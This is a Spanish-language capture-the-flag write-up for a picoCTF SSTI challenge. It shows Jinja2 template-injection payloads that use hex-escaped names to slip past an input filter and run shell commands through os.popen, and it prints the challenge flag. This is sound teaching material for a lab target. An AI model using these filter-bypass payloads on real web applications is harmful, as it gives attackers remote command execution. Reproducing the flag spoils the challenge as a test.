## Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:51514/)!
## Solución 1
Si intentamos hacer una inyección SSTI nos sale esto 
```
# Stop trying to break me >:(
```
Pero aún así si ponemos `{1+1}` nos sale 2

Ahora vamos a usar una inyección codificada:
```jinja2
{{ 
    request
    |attr('application')
    |attr('\x5f\x5fglobals\x5f\x5f')
    |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
    |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
    |attr('popen')('whoami')
    |attr('read')()
}}
```
Con esto la página nos devuelve que somos root

Vamos a hacer una inyección para ver que archivos hay:
```jinja2
{{
	request|attr('application')|
	attr('\x5f\x5fglobals\x5f\x5f')|
	attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|
	attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|
	attr('popen')('ls -a')|
	attr('read')()
}}
```
Obtenemos esto:
```
# . .. __pycache__ app.py flag requirements.txt
```

Ahora sacamos el contenido del archivo flag
```jinja2
{{
	request|attr('application')|
	attr('\x5f\x5fglobals\x5f\x5f')|
	attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|
	attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|
	attr('popen')('cat flag')|
	attr('read')()
}}
```
Obtenemos esto
```
# picoCTF{sst1_f1lt3r_byp4ss_ece726e9}
```
## Solución 2
Podemos hacer la inyección directo para no ejecutar varias inyecciones
```jinja2
{{
	request|attr('application')|
	attr('\x5f\x5fglobals\x5f\x5f')|
	attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|
	attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|
	attr('popen')('grep picoCTF . -rnw')|
	attr('read')()
}}
```
Obtenemos:
```
# flag:1:picoCTF{sst1_f1lt3r_byp4ss_ece726e9}
```
## Notas adicionales
Se puede hacer con la inyección codificada ya que hay sistemas que bloquean la sintaxis de una inyección.
## Referencias